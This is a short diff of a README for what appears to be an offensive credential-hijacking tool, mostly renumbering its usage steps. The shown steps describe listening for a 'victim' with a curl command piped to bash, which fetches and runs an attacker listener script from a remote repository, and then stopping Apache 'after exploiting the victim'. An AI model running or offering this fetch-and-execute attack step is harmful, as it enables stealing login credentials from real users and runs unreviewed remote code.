@@ -57,13 +57,13 @@ bash fakehost.sh
 I will give you a decision soon, but until then you should create your own!
 There is no easy things in this world. ;)
 ```
-- Listening for victim visiting
+4. - Listening for victim visiting
 
 ```bash
      curl -s https://raw.githubusercontent.com/nu11secur1ty/SSTC-HTTPS-hijack-login-credentials/master/Attacker/Hijack-HTTPS-Listener/kazkuvgluvutu.sh | bash
 ```
 
-3. - After exploiting the victim you should ***Stop Apache2***
+5. - After exploiting the victim you should ***Stop Apache2***
 ```bash
 systemct stop apache2.service
 ```
